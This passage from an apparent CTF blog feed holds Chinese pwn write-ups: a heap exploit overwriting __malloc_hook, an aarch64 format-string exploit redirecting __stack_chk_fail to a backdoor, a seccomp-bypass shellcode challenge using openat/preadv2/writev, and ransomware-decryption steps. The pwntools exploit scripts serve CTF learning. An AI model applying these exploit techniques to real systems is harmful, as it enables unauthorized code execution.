punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c4b61</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/libc-2.23.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x148</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x148</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">19</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="something-changed"><a href="#something-changed" class="headerlink" title="something_changed"></a>something_changed</h3><p>漏洞点是格式化字符串，并且存在后门，限制了输入内容不能包含<code>$</code>，但还是可以直接用<code>fmtstr_payload</code>工具</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// x19</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [xsp+FCCh] [xbp+2Ch]</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [xsp+FD0h] [xbp+30h] BYREF</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [xsp+FF8h] [xbp+58h]</span>  v7 <span class="token operator">=</span> _bss_start<span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v6<span class="token punctuation">,</span> <span class="token number">0x50uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v4 <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">>=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"$"</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试出偏移是<code>14</code>，开了<code>canary</code>保护，所以可以将<code>__stack_chk_fail_got</code>改成<code>backdoor</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> qemu-aarch64 <span class="token parameter variable">-L</span> ./libc/libc/lib ./pwn        aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%paaaaaaaa-0x7f3e313a1400-0x2d70252d70252d70-0xa7025-0x7f3e313a1448-<span class="token punctuation">(</span>nil<span class="token punctuation">)</span>-0x8080808080-0x2c6f242c6f242c6f-0x7f3e313a13e0-0x7f3e30a48a00-0x400888-0x4008c0-0x7f3e313a13e0-0x4b30a489ac-0x6161616161616161-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'aarch64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'120.79.91.95'</span><span class="token punctuation">,</span> <span class="token number">3332</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">0x411018</span><span class="token punctuation">:</span><span class="token number">0x400770</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> write_size<span class="token operator">=</span><span class="token string">'short'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目下载地址：&lt;a href=&quot;https://github.com/0xviol1t/CTF-challenges/tree/main/2024/WKCTF&quot;&gt;https://github.com/0xviol1t/CTF-challenges/tree/main/202</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="heap" scheme="https://starrysky1004.github.io/tags/heap/"/>
    
    <category term="aarch64" scheme="https://starrysky1004.github.io/tags/aarch64/"/>
    
  </entry>
  
  <entry>
    <title>2024春秋杯夏季赛</title>
    <link href="https://starrysky1004.github.io/2024/07/14/2024-chun-qiu-bei-xia-ji-sai/2024-chun-qiu-bei-xia-ji-sai/"/>
    <id>https://starrysky1004.github.io/2024/07/14/2024-chun-qiu-bei-xia-ji-sai/2024-chun-qiu-bei-xia-ji-sai/</id>
    <published>2024-07-14T00:18:02.000Z</published>
    <updated>2024-07-14T00:23:47.395Z</updated>
    
    <content type="html"><![CDATA[<p>比赛打一半去学逆向啦， <code>awdp</code>的<code>pwn</code>没打</p><h3 id="初探勒索病毒"><a href="#初探勒索病毒" class="headerlink" title="初探勒索病毒"></a>初探勒索病毒</h3><pre class="line-numbers language-none"><code class="language-none">题目内容：你服务器上的一张图片被Black Basta勒索病毒给加密了。当你在服务器上还原出该图片后，等待一分钟左右，&#x2F;flag就会变为可读权限。（本题下发后会有一个ssh地址、账号密码，选手可通过ssh来访问环境）（关注微信公众号“勒索病毒头条”，发送关键词“BASTA”可获取该题提示。）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我选择直接获取提示</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">【2024春秋杯夏季赛】https://www.nomoreransom.org/zh/decryption-tools.html搜索BlackBasta，并点击下载。（如果您还需要进一步的提示，可在本公众号输入“BASTA2”获取。）【2024春秋杯夏季赛】<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/flags/"flags"/'</span> ./decryptblocks.py<span class="token builtin class-name">export</span> <span class="token assign-left variable">SRL_IGNORE_MAGIC</span><span class="token operator">=</span><span class="token number">1</span>./decryptblocks.py ./banana.jpg.sah28vut5 ./key.block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题的判断依据是能不能正常访问<code>banana.jpg</code>这个图片，所以把<code>banana.jpg.sah28vut5</code>改成<code>banana.jpg</code>再用上面给的指令解密，图片在<code>/var/www/html</code>目录下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> ./banana.jpg.sah28vut5 ./banana.jpg<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/flags/"flags"/'</span> ./decryptblocks.py<span class="token builtin class-name">export</span> <span class="token assign-left variable">SRL_IGNORE_MAGIC</span><span class="token operator">=</span><span class="token number">1</span>./decryptblocks.py ./banana.jpg ./key.block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Shuffled-Execution"><a href="#Shuffled-Execution" class="headerlink" title="Shuffled_Execution"></a>Shuffled_Execution</h3><pre class="line-numbers language-none"><code class="language-none">题目内容：The Fishmonger found a secured entrance to somewhere...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>一道写<code>shellcode</code>的题，创建了一段可读可写可执行区域，写入<code>0x250</code>的数据后开了沙箱并对输入内容进行随机化操作，但是操作长度的判断是通过<code>strlen</code>获取的，所以直接输入<code>\x00</code>即可绕过</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> len<span class="token punctuation">;</span> <span class="token comment">// rsi</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-18h]</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x1337000</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> s <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1LL</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mmap failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0x1337000LL</span><span class="token punctuation">,</span> <span class="token number">0x250LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">shuffle</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>s<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> len <span class="token operator">&lt;=</span> <span class="token number">0xAF</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">entrance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"Error triggered..."</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v4<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看沙箱内容，发现禁用了<code>execve execveat open read readv pread preadv write sendmsg</code>，最后选择用<code>openat preadv2 writev</code>，需要注意的是<code>preadv2 writev</code>的用法</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">2147418112LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">59LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">322LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">19LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">17LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">295LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">40LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_load</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v2 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例如下，即<code>preadv2</code>的二参是一个结构体，且这个结构体包含了数据缓冲区地址以及长度，就相当于原来<code>read</code>的二参和三参</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/uio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SYS_preadv2</span> <span class="token expression"><span class="token number">327</span></span></span><span class="token class-name">ssize_t</span> <span class="token function">preadv2</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span>iov<span class="token punctuation">,</span> <span class="token keyword">int</span> iovcnt<span class="token punctuation">,</span> <span class="token class-name">off_t</span> offset<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_preadv2<span class="token punctuation">,</span> fd<span class="token punctuation">,</span> iov<span class="token punctuation">,</span> iovcnt<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 打开文件</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 准备读取数据的缓冲区</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">// 设置读取操作的 iovec 结构体</span>    <span class="token keyword">struct</span> <span class="token class-name">iovec</span> iov<span class="token punctuation">;</span>    iov<span class="token punctuation">.</span>iov_base <span class="token operator">=</span> buffer<span class="token punctuation">;</span>    iov<span class="token punctuation">.</span>iov_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用 preadv2 读取文件数据到缓冲区</span>    <span class="token class-name">ssize_t</span> bytes_read <span class="token operator">=</span> <span class="token function">preadv2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>iov<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes_read <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"preadv2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 输出读取的数据</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> bytes_read<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 关闭文件</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终<code>exp</code>如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token 